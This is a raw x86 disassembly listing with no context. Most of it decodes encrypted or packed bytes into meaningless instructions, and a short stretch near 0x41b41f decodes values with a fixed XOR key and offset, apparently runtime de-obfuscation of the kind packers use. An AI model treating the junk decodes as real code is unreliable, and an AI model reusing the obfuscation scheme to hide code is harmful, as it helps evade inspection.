  41adda:	and    DWORD PTR [eiz*8+0x5a5f9b57],ebp
  41ade1:	xor    DWORD PTR [ecx+ecx*1-0x790b7695],edi
  41ade8:	mov    ecx,0x413d8827
  41aded:	jmp    0x41ad9d
  41adef:	xor    eax,0xba3d1adf
  41adf4:	add    bh,BYTE PTR [esi]
  41adf6:	pushf  
  41adf7:	ror    DWORD PTR [ebx],1
  41adf9:	stos   BYTE PTR es:[edi],al
  41adfa:	push   ss
  41adfb:	aad    0xec
  41adfd:	dec    edi
  41adfe:	addr16 adc ebx,esi
  41ae01:	inc    ecx
  41ae02:	pop    ebp
  41ae03:	call   0xecad:0x75bd82d0
  41ae0a:	sbb    eax,0x8c113e98
  41ae0f:	mov    esp,0x637743c5
  41ae14:	imul   esi,ebx,0xe5b38ee3
  41ae1a:	neg    BYTE PTR [ecx+0xb358969]
  41ae20:	sub    al,al
  41ae22:	inc    edx
  41ae23:	add    DWORD PTR [ecx+0x5],0x8af5f767
  41ae2a:	xor    al,0xcd
  41ae2c:	repnz (bad) 
  41ae2e:	shl    BYTE PTR [ebp-0x4130e3d2],cl
  41ae34:	data16 mov ds:0xb31546f4,al
  41ae3a:	sar    BYTE PTR [ebp-0x59391a81],cl
  41ae40:	push   ebp
  41ae41:	dec    ebp
  41ae42:	mov    al,0xe3
  41ae44:	xor    al,0x82
  41ae46:	mov    al,0x22
  41ae48:	nop
  41ae49:	stos   BYTE PTR es:[edi],al
  41ae4a:	push   eax
  41ae4b:	(bad)  
  41ae4c:	adc    edi,esp
  41ae4e:	sub    ebx,DWORD PTR [esi+0x5]
  41ae51:	or     DWORD PTR ds:[edi-0x52],edi
  41ae55:	gs mov ecx,0x1e6644cb
  41ae5b:	les    esi,FWORD PTR [ebx]
  41ae5d:	pusha  
  41ae5e:	jbe    0x41ae2c
  41ae60:	and    DWORD PTR [edx+edx*8-0x4c],ebx
  41ae64:	jmp    0x53b3:0x4fe3ff62
  41ae6b:	sbb    edx,esp
  41ae6d:	mov    esi,0x597896a8
  41ae72:	shl    BYTE PTR [eax],1
  41ae74:	xchg   edx,eax
  41ae75:	out    0xa5,eax
  41ae77:	xor    dh,BYTE PTR [edx-0xff8515c]
  41ae7d:	mov    BYTE PTR [edi],cl
  41ae7f:	xchg   ebx,eax
  41ae80:	test   al,0xa6
  41ae82:	inc    esp
  41ae83:	mov    bh,0x44
  41ae85:	adc    BYTE PTR [eax],al
  41ae87:	sbb    edx,DWORD PTR [eax]
  41ae89:	mov    esi,0xca4e40c0
  41ae8e:	hlt    
  41ae8f:	aam    0xed
  41ae91:	mov    ebp,esp
  41ae93:	or     ebp,DWORD PTR [edx]
  41ae95:	cmp    BYTE PTR [ebx-0x36],al
  41ae98:	rcl    DWORD PTR [ecx*4-0x20d53ebc],cl
  41ae9f:	test   al,0x27
  41aea2:	jbe    0x41ae39
  41aea4:	or     ecx,DWORD PTR [edx+0x2be4eaec]
  41aeaa:	sbb    bh,BYTE PTR [ecx]
  41aeac:	mov    bh,0x32
  41aeae:	push   ebp
  41aeaf:	add    eax,0xc5f4a997
  41aeb4:	push   ds
  41aeb5:	retf   
  41aeb6:	sub    eax,DWORD PTR [ecx]
  41aeb8:	adc    esi,ebx
  41aeba:	repz sbb DWORD PTR [edx],ebx
  41aebd:	aam    0xd2
  41aebf:	inc    edx
  41aec0:	and    BYTE PTR [edi+0x17],0x40
  41aec4:	sub    ebp,DWORD PTR [esp+esi*4+0x8]
  41aec8:	(bad)  
  41aec9:	sti    
  41aeca:	sbb    ah,BYTE PTR [esi]
  41aecc:	cmp    al,cl
  41aece:	ficomp WORD PTR [eax]
  41aed0:	or     ebp,eax
  41aed2:	in     al,0x8a
  41aed4:	stos   DWORD PTR es:[edi],eax
  41aed5:	xor    eax,0x75b37a25
  41aeda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aedb:	scas   eax,DWORD PTR es:[edi]
  41aedc:	mov    al,0x1d
  41aede:	popf   
  41aedf:	adc    DWORD PTR [edi],esi
  41aee1:	pop    eax
  41aee2:	sbb    ch,BYTE PTR [eax+0x71a55a89]
  41aee8:	es jg  0x41ae9d
  41aeeb:	add    DWORD PTR [eax],edi
  41aeed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeee:	(bad)  
  41aeef:	sbb    eax,0xb6075f99
  41aef4:	lock stc 
  41aef6:	je     0x41ae7d
  41aef8:	sub    eax,0x567394b8
  41aefd:	push   ebx
  41aefe:	xlat   BYTE PTR ds:[ebx]
  41aeff:	and    ecx,DWORD PTR [edi-0x5e5c539b]
  41af05:	in     al,0xcb
  41af07:	pop    ebx
  41af08:	test   al,0x5c
  41af0a:	nop
  41af0b:	sub    eax,0x2edc4733
  41af10:	scas   eax,DWORD PTR es:[edi]
  41af11:	push   0xda51c3c5
  41af16:	pop    eax
  41af17:	fnsave [eax-0x2f]
  41af1a:	push   edi
  41af1b:	in     al,0xce
  41af1d:	sbb    DWORD PTR [ebx],ebx
  41af1f:	in     eax,0x22
  41af21:	shl    edx,cl
  41af23:	loop   0x41aefb
  41af25:	jns    0x41af7c
  41af27:	call   0x1a91cc04
  41af2c:	push   ss
  41af2d:	gs or  dl,ch
  41af30:	mov    eax,DWORD PTR [eax+0x4c009d9a]
  41af36:	and    eax,0x1f81a3d4
  41af3b:	in     eax,0xea
  41af3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af3e:	cwde   
  41af3f:	or     ah,BYTE PTR [ebp+0x12]
  41af42:	outs   dx,BYTE PTR ds:[esi]
  41af43:	mov    dl,0x98
  41af45:	pop    esi
  41af46:	adc    DWORD PTR [ecx-0x2591dfe2],ecx
  41af4c:	sub    eax,0x6d7426f9
  41af51:	push   edi
  41af52:	pop    edx
  41af53:	and    edx,DWORD PTR [ebx]
  41af55:	shl    BYTE PTR [ecx-0x52a2cfca],0x44
  41af5c:	repnz xor esi,DWORD PTR [eax]
  41af5f:	sub    esp,DWORD PTR [ebp+0x6a]
  41af62:	das    
  41af63:	dec    eax
  41af64:	mov    al,0x22
  41af66:	ss loope 0x41af99
  41af69:	out    0x29,eax
  41af6b:	xchg   BYTE PTR [ebx+0x7fe7cd01],ah
  41af71:	shl    DWORD PTR [esi],cl
  41af73:	push   es
  41af74:	or     DWORD PTR [eax+0x17],edx
  41af77:	push   ss
  41af78:	stos   BYTE PTR es:[edi],al
  41af79:	bound  ecx,QWORD PTR [ecx-0x7a9b8335]
  41af7f:	leave  
  41af80:	outs   dx,DWORD PTR ds:[esi]
  41af81:	mov    ch,0xeb
  41af83:	stc    
  41af84:	rcl    DWORD PTR [esi],0xe9
  41af87:	cs fdivp st(3),st
  41af8a:	aas    
  41af8b:	push   ecx
  41af8c:	pop    esp
  41af8d:	push   cs
  41af8e:	add    al,0x3c
  41af90:	sbb    al,0xfa
  41af92:	mov    cs,WORD PTR [ebx-0x41]
  41af95:	(bad)  [ebp+0x4e]
  41af98:	cmc    
  41af99:	lock out dx,al
  41af9b:	pop    es
  41af9c:	sbb    eax,0xb3d967d9
  41afa1:	sbb    DWORD PTR [esi],ebp
  41afa3:	lds    eax,FWORD PTR [eax+0x76f9de94]
  41afa9:	pop    edi
  41afaa:	lods   al,BYTE PTR ds:[esi]
  41afab:	es xchg ebx,ecx
  41afae:	jmp    0x41b1e3
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi+0x7e181003]
  41afc0:	test   al,0x7c
  41afc2:	jle    0x41afd4
  41afc4:	fidivr WORD PTR [edi+0x78]
  41afc7:	adc    BYTE PTR [esi+0x78],bh
  41afca:	js     0x41af8b
  41afcc:	cmp    BYTE PTR [ebx-0x73],0xda
  41afd0:	pusha  
  41afd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afd2:	nop
  41afd3:	in     eax,0xd8
  41afd5:	ja     0x41b024
  41afd7:	pop    ds
  41afd8:	loopne 0x41b059
  41afda:	out    0xe1,al
  41afdc:	and    DWORD PTR [edi+0x50],edi
  41afdf:	addr16 leave 
  41afe1:	mov    BYTE PTR [eax-0x12f1956b],bh
  41afe7:	push   es
  41afe8:	dec    DWORD PTR [ebx-0x416551ec]
  41afee:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41aff0:	dec    ebp
  41aff1:	in     al,0x5f
  41aff3:	iret   
  41aff4:	push   eax
  41aff5:	jl     0x41afff
  41aff7:	jge    0x41af92
  41aff9:	add    DWORD PTR [ebp-0x42],0x49
  41affd:	mov    ds:0x20657e00,eax
  41b002:	and    BYTE PTR [edi],cl
  41b004:	(bad)  [ebx-0xf01bddb]
  41b00a:	push   ds
  41b00b:	ret    
  41b00c:	icebp  
  41b00d:	mov    ecx,0xa5685f1
  41b012:	add    BYTE PTR [ebx],dl
  41b014:	ret    
  41b015:	pop    eax
  41b016:	jb     0x41afe5
  41b018:	sbb    eax,0xdf80b1fd
  41b01d:	or     edx,edx
  41b01f:	adc    BYTE PTR [eax-0x111ef50a],ch
  41b025:	enter  0x23c1,0xfa
  41b029:	pop    ebx
  41b02a:	int    0x93
  41b02c:	push   esi
  41b02d:	test   al,0xfd
  41b02f:	retf   
  41b030:	add    eax,0x450c4bbf
  41b035:	inc    esp
  41b036:	mov    esi,0xe8b69459
  41b03b:	push   cs
  41b03c:	sub    DWORD PTR [edi],0x9cc196aa
  41b042:	out    dx,al
  41b043:	jl     0x41afd9
  41b045:	cmp    BYTE PTR [ebx],ch
  41b047:	scas   al,BYTE PTR es:[edi]
  41b048:	jo     0x41b024
  41b04a:	xor    eax,0xedff562c
  41b04f:	or     dl,dl
  41b051:	or     DWORD PTR [edx+0x604d7e5b],0x1ba990b6
  41b05b:	mul    edi
  41b05d:	mov    WORD PTR gs:[ebp+0x30ddb7ce],fs
  41b064:	mov    esp,0xd60d37a6
  41b069:	int    0xb3
  41b06b:	iret   
  41b06c:	call   0xae03:0x4f72900d
  41b073:	enter  0x58e8,0x6f
  41b077:	nop
  41b078:	shr    BYTE PTR [ebx],0x9
  41b07b:	and    eax,0x45583c48
  41b080:	scas   eax,DWORD PTR es:[edi]
  41b081:	dec    ebp
  41b082:	cmp    bh,BYTE PTR [esi+eiz*4+0x6b]
  41b086:	pop    ecx
  41b087:	into   
  41b088:	les    ebp,FWORD PTR [edi-0x1534e360]
  41b08e:	jnp    0x41b0b8
  41b090:	inc    edi
  41b091:	fs test bl,ah
  41b094:	and    al,0x32
  41b096:	jo     0x41b0f1
  41b098:	int    0x57
  41b09a:	out    0xed,al
  41b09c:	jne    0x41b0c7
  41b09e:	push   cs
  41b09f:	xchg   ebp,eax
  41b0a0:	test   al,0x7f
  41b0a2:	in     al,dx
  41b0a3:	pop    edx
  41b0a4:	arpl   WORD PTR [eax+0x3142e062],dx
  41b0aa:	push   ss
  41b0ab:	not    ecx
  41b0ad:	fdivr  st,st(7)
  41b0af:	mov    al,ds:0xef686c68
  41b0b4:	dec    edi
  41b0b5:	jb     0x41b0c4
  41b0b7:	out    dx,eax
  41b0b8:	es xchg edx,eax
  41b0ba:	pop    ecx
  41b0bb:	mov    gs,WORD PTR [ebp+0x45]
  41b0be:	in     al,0xa4
  41b0c0:	xor    al,0xb4
  41b0c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0c3:	pusha  
  41b0c4:	fild   QWORD PTR [ecx+0x77]
  41b0c7:	cmp    BYTE PTR [edi],bl
  41b0c9:	or     eax,0xc5e06d28
  41b0ce:	inc    esi
  41b0cf:	pushf  
  41b0d0:	ds dec ebx
  41b0d2:	mov    edi,0x5e4fa433
  41b0d7:	ret    
  41b0d8:	in     al,0x1b
  41b0da:	jge    0x41b0c5
  41b0dc:	sbb    eax,eax
  41b0de:	mov    bh,0xde
  41b0e0:	out    0x3c,al
  41b0e2:	push   cs
  41b0e3:	scas   al,BYTE PTR es:[edi]
  41b0e4:	int    0x54
  41b0e6:	pop    ds
  41b0e7:	icebp  
  41b0e8:	js     0x41b132
  41b0ea:	outs   dx,BYTE PTR ds:[esi]
  41b0eb:	add    bl,BYTE PTR [ebp+0x16]
  41b0ee:	mov    al,ds:0x94b02b99
  41b0f3:	inc    ecx
  41b0f4:	mov    dh,0x34
  41b0f6:	xchg   esp,eax
  41b0f7:	retf   0x5e29
  41b0fa:	sbb    BYTE PTR [ebp+0x77651088],cl
  41b100:	cmp    eax,ebx
  41b102:	sahf   
  41b103:	mov    BYTE PTR fs:[eax],ah
  41b106:	dec    edi
  41b107:	scas   al,BYTE PTR es:[edi]
  41b108:	inc    eax
  41b109:	sar    dl,0xf4
  41b10c:	pushf  
  41b10d:	call   0xe57135d5
  41b112:	mov    fs,WORD PTR [eax+0x537d061a]
  41b118:	adc    edx,DWORD PTR [ebp-0x34]
  41b11b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b11c:	cld    
  41b11d:	mov    esi,0x487d5dee
  41b122:	xchg   esi,eax
  41b123:	sahf   
  41b124:	loope  0x41b0cd
  41b126:	push   0xffffffd0
  41b128:	mov    eax,ds:0x3b3bc22f
  41b12d:	lods   eax,DWORD PTR ds:[esi]
  41b12e:	mov    BYTE PTR [esi-0x2c],cl
  41b131:	push   esp
  41b132:	xchg   DWORD PTR [ebx+0x75],edi
  41b135:	mov    eax,0x220ee1be
  41b13a:	xlat   BYTE PTR ds:[ebx]
  41b13b:	pop    ecx
  41b13c:	in     al,0x8a
  41b13e:	or     BYTE PTR [edx+0x45c604e2],ch
  41b144:	cdq    
  41b145:	xor    bl,BYTE PTR [edx+0x3d]
  41b148:	mov    eax,ds:0x298d8685
  41b14d:	sub    dh,dh
  41b14f:	cmp    al,0xc0
  41b151:	sar    DWORD PTR [ecx+0x6b],1
  41b154:	dec    edi
  41b155:	inc    edx
  41b156:	scas   eax,DWORD PTR es:[edi]
  41b157:	in     al,0x21
  41b159:	pop    ebp
  41b15a:	sub    edi,DWORD PTR ds:0xbdbfa35e
  41b160:	jl     0x41b1d9
  41b162:	mov    bh,0x37
  41b164:	in     al,0x70
  41b166:	xor    ecx,DWORD PTR [eax+0x59]
  41b169:	pop    edi
  41b16a:	mov    ebp,0x68bafd26
  41b16f:	cmp    al,dh
  41b171:	xchg   ebx,eax
  41b172:	ficomp WORD PTR [esi+0x621f32ad]
  41b178:	std    
  41b179:	sahf   
  41b17a:	imul   ebx,DWORD PTR [ebp+0x1b],0x2e05f870
  41b181:	xchg   ecx,eax
  41b182:	mov    esi,DWORD PTR [ecx]
  41b184:	cmp    ecx,ebx
  41b186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b187:	dec    ebx
  41b188:	inc    eax
  41b18a:	test   BYTE PTR [esi+0x2c65fde0],bh
  41b190:	mov    ecx,0xba4751db
  41b195:	clc    
  41b196:	lock inc ebp
  41b198:	shl    DWORD PTR ds:0x29c7ce40,cl
  41b19e:	pop    es
  41b19f:	push   ebx
  41b1a0:	sbb    cl,BYTE PTR [ebp-0x71072b2c]
  41b1a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1a7:	push   0x366c1d15
  41b1ac:	into   
  41b1ad:	adc    eax,0xa1ff002
  41b1b2:	inc    esp
  41b1b3:	dec    esi
  41b1b4:	push   ebx
  41b1b5:	mov    esi,0xe91ad68d
  41b1ba:	xchg   DWORD PTR [edi+0x13],esi
  41b1bd:	sub    ecx,esp
  41b1bf:	xchg   edi,eax
  41b1c0:	scas   eax,DWORD PTR es:[edi]
  41b1c1:	mov    cl,0xe5
  41b1c3:	push   esi
  41b1c4:	pop    ss
  41b1c5:	jne    0x41b233
  41b1c7:	std    
  41b1c8:	lahf   
  41b1c9:	mov    ds:0x8f97d93,al
  41b1ce:	retf   0xb0e2
  41b1d1:	enter  0x2b3a,0x55
  41b1d5:	mov    ecx,0x969b000f
  41b1da:	or     al,0x89
  41b1dc:	rcl    BYTE PTR [edi+0x55],0x5c
  41b1e0:	leave  
  41b1e1:	push   ds
  41b1e2:	hlt    
  41b1e3:	dec    ecx
  41b1e4:	mov    eax,DWORD PTR [ebp-0x1c]
  41b1e7:	jmp    0x41b41c
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	shr    BYTE PTR ss:[bp+di],0x7a
  41b1fa:	test   al,0x72
  41b1fc:	sub    ah,bl
  41b1fe:	jg     0x41b278
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b20a
  41b205:	sbb    al,0x78
  41b207:	mov    ds:0xb5b91,eax
  41b20c:	cs int 0xfd
  41b20f:	fidivr DWORD PTR [ecx+0x6bdea7f8]
  41b215:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b217:	gs pop ds
  41b219:	popa   
  41b21a:	adc    DWORD PTR [ebp-0x7730925d],eax
  41b220:	out    0xb0,al
  41b222:	cmp    al,0x16
  41b224:	das    
  41b225:	pop    edx
  41b226:	test   eax,0xefe9e72b
  41b22b:	xor    al,0x9c
  41b22d:	and    ebp,DWORD PTR [ecx+0x51]
  41b230:	ror    BYTE PTR [eax-0x6f],0x15
  41b234:	xchg   ebp,eax
  41b235:	aam    0x37
  41b237:	inc    edx
  41b238:	fwait
  41b239:	sub    bh,BYTE PTR [ecx-0x46]
  41b23c:	(bad)  
  41b23d:	imul   esi,esp,0x40
  41b240:	dec    ecx
  41b241:	stc    
  41b242:	push   ecx
  41b243:	add    DWORD PTR [edi+0x27ab9358],edi
  41b249:	repnz sbb esp,DWORD PTR [esi+edx*2+0x7808419d]
  41b251:	iret   
  41b252:	std    
  41b253:	adc    al,0xb3
  41b255:	sbb    ecx,DWORD PTR [eax-0x47]
  41b258:	test   DWORD PTR [esi+0x3d250976],edi
  41b25e:	leave  
  41b25f:	xlat   BYTE PTR ds:[ebx]
  41b260:	add    ah,BYTE PTR [eax+0x5d49c849]
  41b266:	dec    ecx
  41b267:	ds test eax,0xc24457b1
  41b26d:	test   DWORD PTR [eax+ebp*2+0x45e64d57],edx
  41b274:	xchg   ebx,eax
  41b275:	cmp    BYTE PTR [ebp+0x79],cl
  41b278:	lea    ebx,[ebx-0x71a6b79d]
  41b27e:	mov    bh,0x2a
  41b280:	push   edi
  41b281:	sbb    eax,0x92685902
  41b286:	outs   dx,DWORD PTR ds:[esi]
  41b287:	nop
  41b288:	add    al,BYTE PTR [edx-0x6a]
  41b28b:	(bad)  [edi+0x52]
  41b28e:	and    al,0x7e
  41b290:	loopne 0x41b30f
  41b292:	and    bl,ah
  41b294:	cmp    eax,0x3ae8bd26
  41b299:	call   0x19be:0xbb2e028e
  41b2a0:	pop    esp
  41b2a1:	cld    
  41b2a2:	pop    eax
  41b2a3:	add    esi,DWORD PTR [eax+0x3b]
  41b2a6:	shr    DWORD PTR [ebx],1
  41b2a8:	repnz addr16 xchg edx,eax
  41b2ab:	jge    0x41b2e8
  41b2ad:	xlat   BYTE PTR ds:[ebx]
  41b2ae:	pusha  
  41b2af:	mov    ds:0x5d71a87a,eax
  41b2b4:	call   0x9033995
  41b2b9:	sub    al,0x4b
  41b2bb:	(bad)  [ecx]
  41b2bd:	(bad)  
  41b2be:	rcl    BYTE PTR [eax+0x721ba114],cl
  41b2c4:	dec    eax
  41b2c5:	sbb    bl,cl
  41b2c7:	fcmovnu st,st(7)
  41b2c9:	add    eax,0x9679300e
  41b2ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2cf:	and    al,0xc6
  41b2d1:	outs   dx,BYTE PTR ds:[esi]
  41b2d2:	xchg   esp,eax
  41b2d3:	and    eax,0x5ee1ae86
  41b2d8:	adc    BYTE PTR ds:0xcb859d10,cl
  41b2de:	repz inc esp
  41b2e0:	inc    ebp
  41b2e1:	mov    esi,0xb748aad0
  41b2e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2e7:	js     0x41b2e8
  41b2e9:	sub    ah,BYTE PTR gs:[eax]
  41b2ec:	enter  0x6460,0x47
  41b2f0:	out    dx,eax
  41b2f1:	daa    
  41b2f2:	psubd  mm3,QWORD PTR [edi-0x4b441fe9]
  41b2f9:	mov    al,BYTE PTR [esi]
  41b2fb:	out    0x1a,eax
  41b2fd:	lods   al,BYTE PTR ds:[esi]
  41b2fe:	sbb    al,0x7e
  41b300:	fadd   DWORD PTR [eax+0x2b]
  41b303:	and    eax,0x50adad93
  41b308:	mov    dl,0xd2
  41b30a:	xchg   BYTE PTR [esi],ch
  41b30c:	ret    0xc027
  41b30f:	mov    al,0x26
  41b311:	push   eax
  41b312:	mov    ds:0x68cbbeae,eax
  41b317:	cmp    edi,DWORD PTR [eax]
  41b319:	push   es
  41b31a:	push   ebx
  41b31b:	(bad)  
  41b31c:	leave  
  41b31d:	out    dx,eax
  41b31e:	lods   eax,DWORD PTR ds:[esi]
  41b31f:	mov    eax,ds:0x54822b20
  41b324:	stos   BYTE PTR es:[edi],al
  41b325:	repnz test DWORD PTR [ebx+0x3a],eax
  41b329:	popa   
  41b32a:	(bad)  
  41b32b:	jge    0x41b36f
  41b32d:	leave  
  41b32e:	aam    0xeb
  41b330:	mov    eax,0xcd1ae60a
  41b335:	sahf   
  41b336:	jmp    0x41b390
  41b338:	mov    gs,WORD PTR [edi-0x5d]
  41b33b:	in     al,0x63
  41b33d:	mov    ds:0x230bced9,eax
  41b342:	cmp    DWORD PTR ds:0xff956a3d,edi
  41b348:	dec    eax
  41b349:	(bad)  
  41b34a:	fimul  WORD PTR [ebp-0x62]
  41b34d:	pop    ecx
  41b34e:	xor    ecx,ecx
  41b350:	dec    edx
  41b351:	cmc    
  41b352:	test   eax,0xcf7b5132
  41b357:	inc    esi
  41b358:	jno    0x41b3c6
  41b35a:	aas    
  41b35b:	cli    
  41b35c:	enter  0x8526,0xb2
  41b360:	push   eax
  41b361:	mov    bh,cl
  41b363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b364:	adc    DWORD PTR es:[esi+0x58a3eca9],ebp
  41b36b:	popa   
  41b36c:	rol    eax,cl
  41b36e:	pop    ebx
  41b36f:	dec    edi
  41b370:	inc    esp
  41b371:	push   ds
  41b372:	adc    ah,BYTE PTR [ecx-0x43]
  41b375:	cwde   
  41b376:	sti    
  41b377:	jge    0x41b3b7
  41b379:	mov    dl,0x19
  41b37b:	aam    0xaa
  41b37d:	push   ds
  41b37e:	ret    0xb9d7
  41b381:	je     0x41b320
  41b383:	and    dh,BYTE PTR [ebp+0x68cac756]
  41b389:	(bad)  
  41b38a:	adc    cl,BYTE PTR [edi+0x67617787]
  41b390:	sbb    DWORD PTR [edx],edx
  41b392:	sti    
  41b393:	hlt    
  41b394:	jl     0x41b370
  41b396:	push   ds
  41b397:	pop    es
  41b398:	sub    eax,0x31e7edbd
  41b39d:	in     eax,dx
  41b39e:	sbb    DWORD PTR [edx-0x2ab98e68],ebp
  41b3a4:	xor    BYTE PTR [ebx],bh
  41b3a6:	inc    eax
  41b3a7:	pop    edi
  41b3a8:	jnp    0x41b3e8
  41b3aa:	mov    ?,WORD PTR [edi+0x611965d5]
  41b3b0:	loop   0x41b3ed
  41b3b2:	fst    QWORD PTR [edx+edx*1+0x7a3222a4]
  41b3b9:	arpl   WORD PTR [ebx-0x55761537],cx
  41b3bf:	pushf  
  41b3c0:	mov    ebp,0x90590f89
  41b3c5:	mov    bh,0xa3
  41b3c7:	and    edi,DWORD PTR [ebx]
  41b3c9:	fidiv  WORD PTR [esi+0x10c95bbf]
  41b3cf:	cmp    DWORD PTR ds:0xe5e6dade,ebx
  41b3d5:	pop    ebp
  41b3d6:	adc    ecx,DWORD PTR [ebp+0x6e]
  41b3d9:	jmp    0xfba3:0xf3a26fa9
  41b3e0:	(bad)  
  41b3e1:	fwait
  41b3e2:	je     0x41b3c1
  41b3e4:	jge    0x41b40f
  41b3e6:	(bad)  
  41b3e7:	fist   DWORD PTR [ebp+0xf18ba30]
  41b3ed:	mov    ds:0x5f654f04,al
  41b3f2:	out    dx,al
  41b3f3:	stos   DWORD PTR es:[edi],eax
  41b3f4:	loope  0x41b422
  41b3f6:	add    ecx,DWORD PTR [ecx]
  41b3f8:	mov    dh,0x19
  41b3fa:	pop    ecx
  41b3fb:	mov    WORD PTR [ecx+0x1a],?
  41b3fe:	xchg   esp,eax
  41b3ff:	ss stos BYTE PTR es:[edi],al
  41b401:	(bad)  
  41b402:	ds out dx,al
  41b404:	jp     0x41b39f
  41b406:	push   ebp
  41b407:	jae    0x41b430
  41b409:	lods   ax,WORD PTR ds:[esi]
  41b40b:	repz xlat BYTE PTR ds:[ebx]
  41b40d:	push   cs
  41b40e:	icebp  
  41b40f:	ror    DWORD PTR [eax-0x4b],cl
  41b412:	loop   0x41b47f
  41b414:	push   0x494768a8
  41b419:	aaa    
  41b41a:	pop    ebp
  41b41b:	gs imul eax,ecx
  41b41f:	sub    esp,eax
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	mov    es,WORD PTR [edi-0x1d3fa1b2]
  41b4bf:	jg     0x41b539
  41b4c1:	adc    BYTE PTR [esi+0x78],bh
  41b4c4:	js     0x41b53b
  41b4c6:	fcom   DWORD PTR [eax]
  41b4c8:	and    ebx,eax
  41b4ca:	into   
  41b4cb:	jl     0x41b4ba
  41b4cd:	push   edx
  41b4ce:	lock sbb esp,esp
  41b4d1:	dec    eax
  41b4d2:	pop    ebp
  41b4d3:	mov    ds:0x5fc23c63,al
  41b4d8:	mov    DWORD PTR [edi+eax*2+0x17],esp
  41b4dc:	pop    ecx
  41b4dd:	mov    dh,0x76
  41b4df:	(bad)  
  41b4e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4e1:	test   ebx,ebp
  41b4e3:	pop    ebx
  41b4e4:	sub    esi,ebx
  41b4e6:	fbstp  TBYTE PTR [esi+0x5d4a8183]
  41b4ec:	and    eax,edx
  41b4ee:	data16 xlat BYTE PTR ds:[ebx]
  41b4f0:	nop
  41b4f1:	icebp  
  41b4f2:	ret    
  41b4f3:	xor    ecx,0x56
  41b4f6:	pop    ecx
  41b4f7:	outs   dx,DWORD PTR ds:[esi]
  41b4f8:	jbe    0x41b556
  41b4fa:	pushf  
  41b4fb:	xor    eax,0x16d9cb89
  41b500:	jle    0x41b52a
  41b502:	push   ecx
  41b503:	mov    DWORD PTR [eax+0x7f],edx
  41b506:	mov    edi,0xb14dbf2c
  41b50b:	mov    WORD PTR [ebx+0x7101d1b4],cs
  41b511:	pop    edx
  41b512:	fwait
  41b513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b514:	je     0x41b4e2
  41b516:	test   DWORD PTR [esi],edx
  41b518:	jmp    0xcb01:0xa4231b39
  41b51f:	xchg   esp,eax
  41b520:	cli    
  41b521:	les    edi,FWORD PTR [eax+0x36a15ddb]
  41b527:	inc    ebx
  41b528:	xchg   edi,eax
  41b529:	jnp    0x41b4b6
  41b52b:	dec    ebp
  41b52c:	mov    ?,WORD PTR [ebx]
  41b52e:	daa    
  41b52f:	shl    BYTE PTR [edi+0x4e],cl
  41b532:	hlt    
  41b533:	fs add dl,dh
  41b536:	aas    
  41b537:	mov    ebx,0x3dcdba52
  41b53c:	ss pop eax
  41b53e:	pop    esp
  41b53f:	mov    ds:0xa125b3d6,eax
  41b544:	add    cl,BYTE PTR [ecx-0x63]
  41b547:	stos   DWORD PTR es:[edi],eax
  41b548:	sub    al,0x77
  41b54a:	mov    ds:0x5b8fd2cb,al
  41b54f:	and    al,0x20
